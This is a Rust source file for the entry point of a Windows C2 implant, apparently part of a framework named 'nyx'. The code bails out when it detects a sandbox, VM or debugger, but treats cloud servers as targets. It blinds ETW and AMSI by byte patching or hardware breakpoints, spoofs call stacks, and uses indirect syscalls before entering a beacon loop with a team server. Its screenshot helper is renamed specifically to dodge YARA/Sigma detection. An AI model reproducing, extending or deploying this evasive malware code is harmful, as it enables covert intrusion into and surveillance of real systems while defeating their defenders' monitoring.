//! PIC entry point + task loop bootstrap.
//!
//! For a `cdylib`/shellcode implant the "entry" is an exported function the
//! loader calls (reflective DLL injection) or a thread the host spins up. It:
//!   1. locates ntdll + resolves the API set it needs (no allocation yet),
//!   2. the global allocator self-bootstraps on first `alloc`,
//!   3. runs the beacon loop: check-in → receive tasks → execute → repeat.
//!
//! All Windows-only. On the dev host this module is excluded by cfg.
//!
//! The real PIC extraction (Stardust-style sRDI) turns the cdylib into raw
//! position-independent shellcode whose first byte is the entry below. Until
//! that extraction step exists, the function is the reflective entry a
//! host-side loader calls after mapping the DLL.

#![cfg(target_os = "windows")]

use crate::resolve::LiveNtdll;

// ---- Shared bootstrap (DRY) -----------------------------------------------

/// Core bootstrap: resolve ntdll → init syscalls → gap scan → blind.
/// Returns `Some(ntdll)` on success. Called by both `nyx_entry` and
/// `nyx_beacon_oneshot` to avoid duplicating the init sequence.
///
/// # Safety
/// Must be called once from the single beacon thread at process start.
unsafe fn bootstrap() -> Option<LiveNtdll> {
    let ntdll = LiveNtdll::locate()?;

    // Anti-debug / anti-sandbox / anti-VM: if the environment looks hostile
    // (VM detected, debugger attached, sandbox uptime too short), abort early
    // — don't execute tasks under observation.
    //
    // envprobe (P0, EDR_BLINDNESS_UPGRADE_2026-07.md §2): the 5-check quiet
    // suite. Runs BEFORE antidebug so the zero-API checks (CPUID/RDTSC) fire
    // first with minimal behavioral noise. A positive VM/sandbox signal is
    // the strongest gate — these have near-zero false-positive rates.
    //
    //   min_uptime = 600 (10 min): the previous `looks_sandboxed(0)` call
    //   effectively DISABLED the uptime branch (uptime_secs() < 0 is never
    //   true), leaving only BeingDebugged/ProcessDebugPort to gate. A real
    //   interactive endpoint is usually minutes+ old; a freshly-spun sandbox
    //   is seconds old. 600s is a conservative threshold that avoids tripping
    //   on a slow-booting real host while catching the typical sandbox.
    //
    //   Test override: setting the `NYX_SKIP_SANDBOX=1` environment variable
    //   bypasses both the envprobe and antidebug gates. This is for authorized
    //   testing on VMs/VPS where the anti-analysis suite would false-positive
    //   (a research VPS IS a VM, so CPUID/RDTSC correctly flag it). The gate
    //   reads the env via GetEnvironmentVariableA — production deployments
    //   never set this variable, so the anti-analysis suite runs normally.
    // Skip sandbox detection if NYX_SKIP_SANDBOX=1 env var is set (for testing
    // on VMs/VPS where envprobe correctly flags the virtual environment), OR
    // if compiled with the `nyx_skip_sandbox` cfg flag (for SYSTEM-context
    // deployments where env vars can't be reliably passed through schtask).
    let skip_sandbox = {
        let env_skip = unsafe {
            crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableA")
                .map(|addr| {
                    type FnGetEnv = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
                    let f: FnGetEnv = core::mem::transmute(addr);
                    let mut buf = [0u8; 2];
                    let n = f(
                        b"NYX_SKIP_SANDBOX\0".as_ptr(),
                        buf.as_mut_ptr(),
                        buf.len() as u32,
                    );
                    n == 1 && buf[0] == b'1'
                })
                .unwrap_or(false)
        };
        env_skip || cfg!(nyx_skip_sandbox)
    };

    // VM/sandbox detection — BEFORE we spend cycles on evasion init.
    if !skip_sandbox
        && matches!(
            unsafe { crate::envprobe::looks_like_analysis_env() },
            crate::envprobe::EnvVerdict::AnalysisEnv
        )
    {
        // VM detected. Before bailing, check: is this a legitimate cloud
        // server (long uptime, real workload) or an automated sandbox
        // (minutes old, minimal processes)? Cloud servers are valid targets;
        // we should NOT abort on them just because they're VMs.
        if !unsafe { crate::envprobe::looks_like_cloud_server() } {
            // Looks like a sandbox — bail out.
            return None;
        }
        // Cloud server confirmed — proceed with evasion init.
    }
    if !skip_sandbox && crate::antidebug::looks_sandboxed(600) {
        // Under a debugger or inside a fresh sandbox → bail out.
        // A production implant would set a flag; here we use the same early
        // return pattern as a failed locate (the caller spins, or exits).
        return None;
    }

    let _ssn_table = ntdll.resolve_table_owned();
    diag_mark(b"1_syscalls");

    // Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs
    crate::syscalls::init_global();
    diag_mark(b"2_init_global");

    // HookChain
    let _hookchain_count = unsafe { crate::hookchain::apply() };
    diag_mark(b"3_hookchain");

    // .pdata gap scan + stack-spoof init.
    let scanner = crate::evasion_glue::LivePdataScanner;
    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
        let leaked: &'static _ = alloc::boxed::Box::leak(alloc::boxed::Box::new(pool));
        unsafe { crate::stack::set_gap_pool(leaked) };
        let _ = crate::stack::stage_for(leaked);

        // ---- Stack-spoof auto-arm (task #2) -----------------------------------
        // The RSP swap was historically gated OFF by default (SPOOF_SWAP_ENABLED
        // = false) because a naive swap #CP-faults on CET/shadow-stack hosts.
        // The CET-aware decision logic (`evasionsdk::swap::decide`) AND the live
        // CET probe (`version::cet_active` via IsProcessorFeaturePresent(41))
        // are both real and selftest-verified — what was missing was the call
        // site that arms the swap when the host is confirmed CET-off with a
        // usable gap pool. We add it here: arm iff decide() returns Execute.
        //
        // This makes the spoof active by default on every Win10 / Server 2019
        // box (CET didn't exist) and every Win11 box where the process hasn't
        // opted into CET, while staying inert on CET-on hosts (Win11 24H2+ with
        // a CET-enabled binary manifest). The hot path's own decide() check in
        // with_spoofed_stack remains as the defence-in-depth re-validation.
        //
        // Operator escape hatch: NYX_SPOOF_OFF=1 forces the swap OFF regardless
        // of the host posture (for targets with non-standard shadow-stack
        // behavior where the CET probe falsely reports off). Mirrors the
        // NYX_FOLIAGE_OFF pattern.
        let spoof_disabled = match option_env!("NYX_SPOOF_OFF") {
            Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
            None => false,
        };
        let cet_on = crate::version::cet_active();
        let gaps_usable = leaked.is_usable();
        if !spoof_disabled
            && matches!(
                nyx_implant_evasionsdk::swap::decide(cet_on, gaps_usable),
                nyx_implant_evasionsdk::swap::SwapDecision::Execute
            )
        {
            crate::stack::set_swap_enabled(true);
            diag_mark(b"4b_spoof_armed");
        } else {
            diag_mark(b"4b_spoof_degraded");
        }
    }
    diag_mark(b"4_pdata");

    // ---- Countermeasure init (proxy gadgets, caller-spoof stubs, CFG probe) --
    // Run BEFORE blind (VEH registration) so proxy gadgets and caller-spoof
    // stubs are available when add_hwbp registers the first VEH handler.
    unsafe {
        crate::blind_hwbp::init_countermeasures();
    }
    diag_mark(b"4b_countermeasures");

    // BLIND: HWBP → byte-patch fallback
    let mut hwbp_ok = false;
    if unsafe { crate::blind_hwbp::init_shadow_buffer() } {
        diag_mark(b"5a_hwbp_init");
        let etw_slot = unsafe { crate::blind_hwbp::blind_etw_hwbp() };
        diag_mark(b"5b_hwbp_etw");
        let _amsi_slot = unsafe { crate::blind_hwbp::blind_amsi_hwbp() };
        diag_mark(b"5c_hwbp_amsi");
        hwbp_ok = etw_slot.is_ok();
    }
    if !hwbp_ok {
        let etw_r = crate::blind::patch_etw();
        let nt_r = crate::blind::patch_nt_trace_event();
        let amsi_r = crate::blind::patch_amsi();
        let all_ok = etw_r.is_ok() && nt_r.is_ok() && amsi_r.is_ok();
        crate::blind::BLIND_OK.store(all_ok, core::sync::atomic::Ordering::Release);
        if !all_ok {
            // SAFETY: single-threaded bootstrap; written once, read-only thereafter.
            unsafe {
                *crate::blind::BLIND_ERR.get() = etw_r.err().or(nt_r.err()).or(amsi_r.err());
            }
        }
    } else {
        crate::blind::BLIND_OK.store(true, core::sync::atomic::Ordering::Release);
    }
    diag_mark(b"6_blind_done");

    // ---- CSPRNG registration -------------------------------------------------
    // The no_std PIC implant can't use getrandom's static #[link(name="advapi32")]
    // (the PIC cdylib import table doesn't resolve SystemFunction036 → abort
    // 0xC0000409). Register a PEB-walk resolver instead: dynamically find
    // SystemFunction036 (RtlGenRandom) in advapi32.dll via export_addr, call it
    // directly. SystemFunction036 is the documented stable CSPRNG entry point,
    // available on every Windows version from XP SP2 through 11 25H2.
    let _ = nyx_protocol::crypto::register_csprng(csprng_fill);
    diag_mark(b"7_csprng");
    // ---- LACUNA ghost-frame scanner ------------------------------------------
    // Scan .pdata lacunae in ntdll/kernelbase/win32u for call-stack spoofing.
    // Ghost addresses in .pdata gaps are treated as leaf frames by RtlVirtualUnwind.
    crate::lacuna::bootstrap_scan();
    diag_mark(b"8_lacuna");
    // ---- InsomniacUnwinding check ---------------------------------------------
    crate::insomniac::bootstrap_check();
    diag_mark(b"9_insomniac");

    Some(ntdll)
}

/// CSPRNG fill via PEB-walk-resolved `SystemFunction036` (RtlGenRandom).
///
/// Resolves `SystemFunction036` from `advapi32.dll` on first call (cached in a
/// static), then calls it to fill `buf` with cryptographically-secure random
/// bytes. Returns `true` on success, `false` if the function can't be resolved
/// or the call fails.
///
/// `SystemFunction036` / `RtlGenRandom` is the Windows kernel CSPRNG, documented
/// at <https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-rtlgenrandom>.
/// It's available on all Windows versions from XP SP2 (the earliest supported by
/// any modern toolchain) through Windows 11 25H2 and Server 2025. The export
/// name `SystemFunction036` is ordinal-stable and never renamed across builds.
pub fn csprng_fill(buf: &mut [u8]) -> bool {
    use core::sync::atomic::{AtomicUsize, Ordering};

    // Cache the resolved function address (0 = unresolved, usize::MAX = tried+failed).
    static SYSFUNC036: AtomicUsize = AtomicUsize::new(0);

    let mut addr = SYSFUNC036.load(Ordering::Acquire);
    if addr == 0 {
        // First call: resolve SystemFunction036 from advapi32.dll via PEB walk.
        addr = unsafe { crate::resolve::export_addr(b"advapi32.dll", b"SystemFunction036") }
            .unwrap_or(usize::MAX);
        SYSFUNC036.store(addr, Ordering::Release);
    }
    if addr == usize::MAX {
        return false;
    }

    // SystemFunction036(RandomBuffer: *mut u8, RandomBufferLength: u32) -> BOOL
    type RtlGenRandomFn = unsafe extern "system" fn(*mut u8, u32) -> i32;
    let f: RtlGenRandomFn = unsafe { core::mem::transmute(addr) };

    // RtlGenRandom returns 1 (TRUE) on success. It handles arbitrary buffer
    // sizes internally (chunks if needed), so a single call suffices.
    let ok = unsafe { f(buf.as_mut_ptr(), buf.len() as u32) };
    ok != 0
}

// ---- Public entry points ---------------------------------------------------

/// The reflective/PIC entry. Resolves ntdll, builds the SSN table, primes the
/// indirect-syscall runtime, then enters the beacon loop.
///
/// Marked `#[no_mangle]` so it survives `opt-level="z"` and is the address sRDI
/// extraction marks as the entry point.
#[no_mangle]
pub unsafe extern "system" fn nyx_entry() {
    let Some(_ntdll) = bootstrap() else {
        exit_in_entry(0xFFFF_FFFE);
    };
    diag_mark(b"8_before_loop");
    crate::beacon::beacon_loop();
}
/// CSPRNG register + syscalls only — NO hookchain/blind/pdata). Tests whether
/// the evasion init in bootstrap() is causing the 0xC0000409 abort.
/// Exit codes: same as beacon_oneshot (0xC1 = check-in failed, etc).
#[no_mangle]
pub unsafe extern "system" fn nyx_beacon_noevasion() {
    // Minimal init: ntdll + CSPRNG + syscalls only.
    init_minimal();
    // Now run beacon_oneshot (crypto + transport — all verified OK in selftest).
    let code = crate::beacon::beacon_oneshot();
    unsafe { exit_in_entry(code) };
}

/// **Continuous beacon loop with minimal init** (no evasion). Same as
/// `nyx_beacon_noevasion` but runs the continuous `beacon_loop()` instead of
/// a single oneshot. For authorized testing where the evasion init (hookchain/
/// blind/pdata) causes issues on the specific host.
#[no_mangle]
pub unsafe extern "system" fn nyx_entry_noevasion() {
    diag_mark(b"N0_entry");
    init_minimal();
    diag_mark(b"N1_init_done");
    crate::beacon::set_evasion_off();
    diag_mark(b"N2_evasion_off");
    crate::beacon::beacon_loop();
    diag_mark(b"N3_loop_returned"); // should never reach here
}

/// Minimal initialization: ntdll locate + SSN table + syscalls + CSPRNG.
/// Skips hookchain/blind/pdata (the evasion init). Foliage sleepmask stays
/// enabled — it degrades internally to the data-only floor (heap masking +
/// indirect-syscall sleep) which is safe without the evasion init.
unsafe fn init_minimal() {
    let ntdll = match crate::resolve::LiveNtdll::locate() {
        Some(n) => n,
        None => unsafe { exit_in_entry(0xFE) },
    };
    let _ssn = ntdll.resolve_table_owned();
    crate::syscalls::init_global();
    let _ = nyx_protocol::crypto::register_csprng(csprng_fill);
}

/// Helper: resolve ExitProcess and exit with `code`. Never returns.
unsafe fn exit_in_entry(code: u32) -> ! {
    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
        let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
        f(code);
    }
    // ExitProcess unresolved — fall back to NtTerminateProcess (ntdll).
    if let Some(nt) = crate::resolve::export_addr(b"ntdll.dll", b"NtTerminateProcess") {
        // NtTerminateProcess(Handle, Status) -> NTSTATUS. -1 = current process.
        type NtTerminateProcess = unsafe extern "system" fn(usize, i32) -> i32;
        let f: NtTerminateProcess = core::mem::transmute(nt);
        f(0xFFFF_FFFF_FFFF_FFFF, 0);
    }
    // Last resort: int3 trap — quieter than an infinite spin loop.
    core::arch::asm!("int3", options(noreturn));
}

#[cfg(nyx_diag)]
/// Diagnostic: write a marker file `C:\nyx\diag_<mark>` so we can see which
/// bootstrap step was reached before a crash. Uses CreateFileA/WriteFile
/// resolved via PEB walk (no std fs). Best-effort — silently ignores errors.
pub fn diag_mark(mark: &[u8]) {
    unsafe {
        use core::ffi::c_void;
        type CreateFileAFn = unsafe extern "system" fn(
            *const u8,
            u32,
            u32,
            *mut c_void,
            u32,
            u32,
            *mut c_void,
        ) -> *mut c_void;
        type WriteFileFn =
            unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

        let cfa = match crate::resolve::export_addr(b"kernel32.dll", b"CreateFileA") {
            Some(a) => a,
            None => return,
        };
        let wf = match crate::resolve::export_addr(b"kernel32.dll", b"WriteFile") {
            Some(a) => a,
            None => return,
        };
        let ch = match crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
            Some(a) => a,
            None => return,
        };

        let create: CreateFileAFn = core::mem::transmute(cfa);
        let write: WriteFileFn = core::mem::transmute(wf);
        let close: CloseHandleFn = core::mem::transmute(ch);

        // Build path: C:\nyx\diag_<mark>
        let mut path = [0u8; 64];
        let prefix = b"C:\\nyx\\diag_";
        let mut i = 0;
        while i < prefix.len() && i < path.len() {
            path[i] = prefix[i];
            i += 1;
        }
        let mut j = 0;
        while j < mark.len() && i < path.len() - 1 {
            path[i] = mark[j];
            i += 1;
            j += 1;
        }
        path[i] = 0; // NUL terminator

        // CREATE_ALWAYS=2, GENERIC_WRITE=0x40000000, FILE_SHARE_WRITE=2
        let h = create(
            path.as_ptr(),
            0x40000000,
            2,
            core::ptr::null_mut(),
            2,
            0,
            core::ptr::null_mut(),
        );
        if h.is_null() || h as usize == usize::MAX {
            return;
        }
        let data = b"ok";
        let mut written: u32 = 0;
        write(
            h,
            data.as_ptr(),
            data.len() as u32,
            &mut written,
            core::ptr::null_mut(),
        );
        close(h);
    }
}

// Production builds ship without --cfg nyx_diag, so diag_mark is a compile-time
// no-op that leaves no forensic marker file on the target host.
#[cfg(not(nyx_diag))]
pub fn diag_mark(_mark: &[u8]) {
    // no-op: diagnostic markers are disabled in production builds
}

/// **Integration-test entry**: resolves ntdll + primes the indirect-syscall
/// runtime + blinds, then runs ONE beacon check-in + task cycle against the
/// configured server and exits with a status. Invoke via
/// `rundll32 nyx_implant_win.dll,nyx_beacon_oneshot` while the team server is
/// running. See `beacon::beacon_oneshot` for exit-code meanings.
#[no_mangle]
pub unsafe extern "system" fn nyx_beacon_oneshot() {
    let Some(_ntdll) = bootstrap() else {
        core::hint::spin_loop();
        return;
    };
    let code = crate::beacon::beacon_oneshot();
    // Exit with the status code so the harness can read %ERRORLEVEL%.
    exit_in_entry(code);
}

/// **Cross-session screenshot helper**: invoked by `CreateProcessAsUserW` inside
/// the active interactive session (NOT Session 0). Captures the current desktop
/// to `C:\Windows\Temp\nyx_shot.bmp` and exits. The Session 0 beacon waits for
/// this process to finish, then reads the BMP back. No beacon loop, no
/// check-in — pure file handoff. Invoke as
/// `rundll32 nyx_implant_win.dll,nyx_screenshot_session`.
#[no_mangle]
pub unsafe extern "system" fn nyx_screenshot_session() {
    // Capture target: a non-descript temp file name. The fixed `nyx_shot.bmp`
    // string was a durable IOC (yara/sigma hit on every cross-session capture);
    // `~dfftmp.bmp` blends with the many `~DfXXXX.tmp` files the Office/filter-
    // driver ecosystem litters under %TEMP%, and the file is deleted by the
    // beacon once read back (cross_session_capture:1262 del_file).
    let path = b"C:\\Windows\\Temp\\~dfftmp.bmp\0";
    // DPI virtualization probe (debug only — compiled out of production).
    #[cfg(feature = "selftest")]
    unsafe { crate::screenshot::dpi_probe_diag() };
    // Propagate capture success/failure into the exit code so the Session-0
    // beacon can distinguish a helper that genuinely produced a BMP (exit 0)
    // from one that failed to write (exit 1). The old code discarded the bool
    // and always exited 0, so a failed capture looked identical to success.
    let ok = crate::screenshot::capture_to_file(path);
    exit_in_entry(if ok { 0 } else { 1 });
}


/// **Screenshot cross-session test entry** (instrumented, for runtime validation
/// without a full beacon+team-server round-trip). Runs `do_screenshot` and
/// writes a tiny diagnostic log to `C:\Windows\Temp\nyx_shot_diag.txt`:
///   - line 1: number of `Response` items produced (0 = total failure)
///   - if an `Err` item is present, line 2 is the error string (this carries the
///     `XSESS_FAIL` step code, e.g. "...failed (step 3: explorer token theft
///     failed...)"). If a `FileChunk` is present, line 2 is "OK <total bytes>".
/// Exits 0 on a successful capture, 1 otherwise. Invoke as
/// `rundll32 nyx_implant_win.dll,nyx_screenshot_test`. NOT shipped in production
/// builds — temporary instrumentation.
#[cfg(feature = "selftest")]
#[no_mangle]
pub unsafe extern "system" fn nyx_screenshot_test() {
    let resp = crate::screenshot::do_screenshot(0);
    // Tally: collect the FileChunk byte total or the first Err string.
    let mut total_bytes: usize = 0;
    let mut err_str: Option<&str> = None;
    for r in &resp {
        match r {
            crate::screenshot::Response::FileChunk { data, .. } => {
                total_bytes = total_bytes.saturating_add(data.len());
            }
            crate::screenshot::Response::Err(s) => {
                if err_str.is_none() {
                    err_str = Some(s.as_str());
                }
            }
            _ => {}
        }
    }
    // Write the diagnostic file via the same CreateFileW/WriteFile path the
    // helper uses — keeps the test self-contained. Built with String::from +
    // push_str (no `format!` macro in this no_std crate).
    let line = if let Some(e) = err_str {
        // step code is embedded in the error string itself
        let mut s = crate::heap::String::from("1\n");
        s.push_str(e);
        s.push('\n');
        s
    } else if total_bytes > 0 {
        let mut s = crate::heap::String::from("chunks=");
        // decimal-encode resp.len() and total_bytes by hand (no format!/no u32::to_string)
        crate::fmt::push_decimal_u64(&mut s, resp.len() as u64);
        s.push_str(" bytes=");
        crate::fmt::push_decimal_u64(&mut s, total_bytes as u64);
        s.push_str("\nOK\n");
        s
    } else {
        crate::heap::String::from("0\n(no response)\n")
    };
    let _ =
        crate::screenshot::capture_diag(b"C:\\Windows\\Temp\\nyx_shot_diag.txt\0", line.as_bytes());

    let ok = err_str.is_none() && total_bytes > 0;
    exit_in_entry(if ok { 0 } else { 1 });
}

/// **Self-test entry** (benign validation). Resolves ntdll, builds the SSN
/// table, and exits the process with a code reporting the result:
///   - exit code = number of SSNs resolved (>0 = PEB walk + resolve worked)
///   - exit code = 0xFFFFFFFF = ntdll could not be located
///
/// Invoke via: `rundll32 nyx_implant_win.dll,nyx_selftest` then check
/// `%ERRORLEVEL%`. This validates the evasion-runtime chain (PEB walk → export
/// table → SSN resolution) on a real Windows host without any network activity
/// or persistence — a benign closed-loop check.
/// Exit with `code` via the resolved ExitProcess; traps if unavailable.
unsafe fn report_exit(exit_proc: Option<usize>, code: u32) -> ! {
    if let Some(e) = exit_proc {
        let f: extern "system" fn(u32) -> ! = core::mem::transmute(e);
        f(code);
    }
    loop {
        core::hint::spin_loop();
    }
}

#[cfg(feature = "selftest")]
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest() {
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");

    // === Phase 1: PEB walk + export table (no alloc) ===
    // Exit 0x600 + N (N = ntdll named export count, ~2365 on Win2019).
    let base = match LiveNtdll::locate_base() {
        Some(b) => b,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let opt = base.add(e_lfanew + 24);
    let magic = *(opt as *const u16);
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = *(opt.add(dd_off) as *const u32);
    let _n_names: u32 = if export_rva != 0 {
        let dir = base.add(export_rva as usize) as *const crate::resolve::ExportDirectory;
        (*dir).number_of_names
    } else {
        0
    };

    // === Phase 2: SSN resolution (allocates) ===
    // Exit 0x100 + N (N = resolved SSN count). Proves allocator + Hell/Halo/Tartarus.
    crate::ntalloc::force_resolve();
    let ntdll = match LiveNtdll::locate() {
        Some(n) => n,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    let table = ntdll.resolve_table_owned();
    let _ssn_count = table.iter().filter(|(_, ssn)| *ssn != u32::MAX).count();

    // === Phase 3: protocol crypto round-trip (no network) ===
    // Exit 0xE01 = success; 0xE00 = failure.
    let ikp = match nyx_protocol::ImplantKeypair::generate() {
        Ok(k) => k,
        Err(_) => report_exit(exit_proc, 0xE00), // CSPRNG failure in selftest
    };
    let dummy_server_pub = [0x42u8; 32];
    let key = ikp.session_key(&dummy_server_pub);
    let pubkey = ikp.public_bytes();
    let plaintext = b"check-in-test-payload";
    let frame = match nyx_protocol::encode_frame(&pubkey, 1, &key, plaintext) {
        Ok(f) => f,
        Err(_) => report_exit(exit_proc, 0xE00), // AEAD seal failure in selftest
    };
    let raw = match nyx_protocol::parse_frame(&frame) {
        Ok(r) => r,
        Err(_) => report_exit(exit_proc, 0xE00),
    };
    let decoded = match nyx_protocol::open_frame(&key, &raw) {
        Ok(p) => p,
        Err(_) => report_exit(exit_proc, 0xE00),
    };
    if decoded.as_slice() != plaintext.as_slice() {
        report_exit(exit_proc, 0xE00);
    }
    // 0xE01: crypto round-trip OK. If an echo server is listening on 8443,
    // continue to the transport test; otherwise report success and exit.
    let payload: [u8; 8] = [0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04];
    match crate::transport::post_frame(b"127.0.0.1", 8443, b"/beacon", &payload, false) {
        Some(resp) => {
            if resp.len() == payload.len() && resp.as_slice() == payload.as_slice() {
                report_exit(exit_proc, 0xF07); // transport + crypto both OK
            } else {
                report_exit(exit_proc, 0xF08); // transport OK but mismatch
            }
        }
        None => report_exit(exit_proc, 0xE01), // no echo server; crypto alone OK
    }
}

/// **Evasion self-test entry** (benign validation of the unhook + blind tracks).
///
/// Runs Phase 4 (NTDLL fresh-map diff) and Phase 5 (AMSI/ETW blind byte-verify)
/// and exits with a single code encoding both results, so an operator gets one
/// observable number for the evasion state on a real host:
///
/// - Phase 4 (unhook): `0x0400 + D` where `D` = bytes differing between the
///   fresh KnownDlls ntdll `.text` and the in-process (hooked) ntdll `.text`.
///   `D == 0` means the host's ntdll was clean (fresh-map is a no-op but
///   proved functional); `D > 0` means it WAS hooked and the fresh map gave us
///   pristine bytes. `0x0FFF` = fresh map itself failed (KnownDlls unavailable).
/// - Phase 5 (blind): `0x0500 | mask` where mask bit0 = ETW patched &
///   byte-verified, bit1 = AMSI patched & byte-verified, bit2 = amsi.dll was
///   present at selftest time.
///
/// The combined exit code is `0x0400 + D` if the fresh map worked, else falls
/// through to Phase 5's code. To read each independently, run with the host in
/// different states (e.g. under an EDR for D>0). Invoke via
/// `rundll32 nyx_implant_win.dll,nyx_selftest_evasion`.
#[cfg(feature = "selftest")]
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_evasion() {
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");

    // Bootstrap the allocator (Phase 2 of the main selftest does this; we need
    // it for the fresh-map's Vec materialization).
    crate::ntalloc::force_resolve();

    // === Phase 4: NTDLL fresh-map unhook diff ===
    let hooked_base = match LiveNtdll::locate_base() {
        Some(b) => b,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    match crate::unhook::fresh_ntdll_text() {
        Some((fresh_base, text_rva, text_size)) => {
            let diffs =
                crate::unhook::text_diff_count(fresh_base, hooked_base, text_rva, text_size);
            crate::unhook::unmap_fresh(fresh_base); // RAII not available across the match
                                                    // Report 0x0400 + D (cap D at 0x3FF to stay in the 0x04XX band).
            let code = 0x0400 + (diffs.min(0x3FF) as u32);
            report_exit(exit_proc, code);
        }
        None => {
            // Fresh map failed (KnownDlls ACL / low IL). Fall through to Phase 5
            // so we still get the blind result. (The unhook-failure case is
            // observable as the absence of a 0x04XX exit: if we reach Phase 5,
            // the fresh map didn't succeed.)
        }
    }

    // === Phase 5: AMSI/ETW blind byte-verify ===
    // Patch ETW (always present) + NtTraceEvent (P2.1b, family-wide) + AMSI
    // (best-effort), then re-read the first bytes and compare to the patch to
    // PROVE the write landed.
    let _ = crate::blind::patch_etw();
    let _ = crate::blind::patch_nt_trace_event();
    let amsi_attempted = crate::blind::patch_amsi().is_ok();

    let mut mask: u32 = 0;
    // ETW byte-verify.
    if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"EtwEventWrite") {
        if crate::blind::already_patched(addr, &crate::blind::ETW_PATCH) {
            mask |= 0x1;
        }
    }
    // AMSI byte-verify (only if amsi.dll was loaded).
    if amsi_attempted {
        mask |= 0x4; // amsi.dll was present
        if let Some(addr) = crate::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer") {
            if crate::blind::already_patched(addr, &crate::blind::AMSI_PATCH) {
                mask |= 0x2;
            }
        }
    }
    report_exit(exit_proc, 0x0500 | mask);
}
